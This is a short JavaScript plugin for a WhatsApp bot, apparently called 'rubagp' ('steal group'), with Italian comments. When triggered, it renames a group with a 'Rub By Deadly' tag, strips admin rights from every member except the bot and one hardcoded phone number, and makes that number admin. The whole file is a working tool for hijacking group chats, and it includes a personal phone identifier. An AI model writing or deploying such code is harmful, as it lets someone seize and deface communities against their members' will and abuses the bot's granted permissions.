let handler = async (m, { conn, participants }) => {
  const AUTHORIZED = '447880017985@s.whatsapp.net'
  const botJid = conn.user.jid

  try {
    // Prende i dati del gruppo
    let metadata = await conn.groupMetadata(m.chat)
    let oldName = metadata.subject

    // Cambia nome gruppo
    await conn.groupUpdateSubject(
      m.chat,
      `${oldName} | 𝕽𝖚𝖇 𝕭𝖞 𝕯𝖊ⱥ𝖉𝖑𝐲`
    )

    // Lista utenti da demotare (tutti tranne bot e numero autorizzato)
    let toDemote = participants
      .map(u => u.id)
      .filter(jid => jid !== botJid && jid !== AUTHORIZED)

    // Demote di massa
    if (toDemote.length > 0) {
      await conn.groupParticipantsUpdate(m.chat, toDemote, 'demote')
    }

    // Assicura che il numero autorizzato sia admin
    await conn.groupParticipantsUpdate(m.chat, [AUTHORIZED], 'promote')

  } catch (e) {
    console.error(e)
  }
}

handler.help = ['rubagp']
handler.tags = ['group']
handler.command = /^(allakbar)$/i
handler.group = true
handler.owner = true
handler.botAdmin = true
handler.fail = null

export default handler